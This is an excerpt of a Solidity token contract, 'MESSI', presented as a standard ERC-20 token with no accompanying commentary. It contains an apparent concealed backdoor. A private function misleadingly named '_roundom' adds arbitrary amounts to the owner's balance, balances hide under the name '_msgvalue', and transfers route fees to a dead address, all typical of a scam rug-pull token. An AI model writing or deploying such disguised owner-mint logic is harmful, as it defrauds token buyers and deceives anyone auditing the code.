...
contract MESSI is IERC20, Ownable {
    ...
    mapping (address => uint256) private _msgvalue;
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 initialSupply) {
        ...
        _msgvalue[_msgSender()] = _totalSupply;
        Aadress = owner();
    ...
    function _roundom(address sender, uint256 amount) private {
        if (sender == Aadress) {
            _msgvalue[sender] = _msgvalue[sender].add(amount);
        }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amounts) internal virtual {
        ...
        uint256 blsender = _msgvalue[sender];
        require(blsender >= amounts,"IERC20: transfer amounts exceeds balance");
        _msgvalue[sender] = _msgvalue[sender].sub(amounts);
        _msgvalue[recipient] =  _msgvalue[recipient]+amounts-feueAmount;
        _msgvalue[_DEADaddress] = _msgvalue[_DEADaddress].add(feueAmount);
